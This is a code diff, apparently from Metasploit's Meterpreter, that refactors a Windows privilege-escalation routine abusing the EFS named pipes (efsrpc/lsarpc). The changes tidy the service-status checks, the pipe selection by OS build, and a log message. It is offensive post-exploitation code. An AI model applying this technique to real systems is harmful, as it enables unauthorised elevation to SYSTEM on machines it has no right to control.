@@ -65,7 +65,7 @@ DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 				}
 
 				if (state != SERVICE_RUNNING && state != SERVICE_START_PENDING && state != SERVICE_CONTINUE_PENDING) {
-					dprintf("[ELEVATE] service_query_status: efs service is not running. Trying to start ..");
+					dprintf("[ELEVATE] service_query_status: efs service is not running. Trying to start...");
 					if (service_start(EFS_SERVICE_NAME) != ERROR_SUCCESS) {
 						BREAK_ON_ERROR("[ELEVATE] service_start: starting efs service failed.");
 					}
@@ -74,33 +74,25 @@ DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 					}
 				}
 
-				if (state != SERVICE_RUNNING && state != SERVICE_START_PENDING && state != SERVICE_CONTINUE_PENDING) {
-					BREAK_ON_ERROR("[ELEVATE] service_query_status: efs service is not running.");
-				}
-				else
-				{
-					DWORD dwTimeout = 30000;
-					if (service_wait_for_status(EFS_SERVICE_NAME, SERVICE_RUNNING, dwTimeout) != ERROR_SUCCESS) {
+				if (state == SERVICE_START_PENDING || state == SERVICE_CONTINUE_PENDING) {
+					if (service_wait_for_status(EFS_SERVICE_NAME, SERVICE_RUNNING, 30000) != ERROR_SUCCESS) {
 						BREAK_ON_ERROR("[ELEVATE] service_wait_for_status: service start timed out.");
 					}
 				}
+				else if (state != SERVICE_RUNNING) {
+					BREAK_ON_ERROR("[ELEVATE] service_query_status: efs service is not running.");
+				}
 			}
 
-			if (!does_pipe_exist(L"\\\\.\\pipe\\efsrpc")) {
-				if (os.dwBuildNumber <= 22000) {
-					if (!does_pipe_exist(L"\\\\.\\pipe\\lsarpc")) {
-						BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: neither \\pipe\\lsarpc nor \\pipe\\efsrpc is not listening.");
-					}
-					wEndpointUUID = &LSARPC_PIPE_MS_EFSR_UUID;
-					wNamedPipeEndpoint = &LSARPC_NAMEDPIPE;
-				}
-				else {
-					BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: \\pipe\\efsrpc is not listening.");
-				}
-			}
-			else {
+			if (does_pipe_exist(L"\\\\.\\pipe\\efsrpc")) {
 				wEndpointUUID = &EFSRPC_PIPE_MS_EFSR_UUID;
 				wNamedPipeEndpoint = &EFSRPC_NAMEDPIPE;
+			}
+			else if (does_pipe_exist(L"\\\\.\\pipe\\lsarpc") && ((os.dwMajorVersion < 10) || ((os.dwMajorVersion == 10) && (os.dwBuildNumber <= 22000)))) {
+				wEndpointUUID = &LSARPC_PIPE_MS_EFSR_UUID;
+				wNamedPipeEndpoint = &LSARPC_NAMEDPIPE;
+			} else {
+				BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: no usable pipes are listening.");
 			}
 		}
 
@@ -157,7 +149,7 @@ DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 		if (dwResult == ERROR_DBG_TERMINATE_THREAD)
 			dwResult = dwTriggerResult;
 
-	} while (0);
+	} while (FALSE);
 
 	if (pThread) {
 		met_api->thread.destroy(pThread);
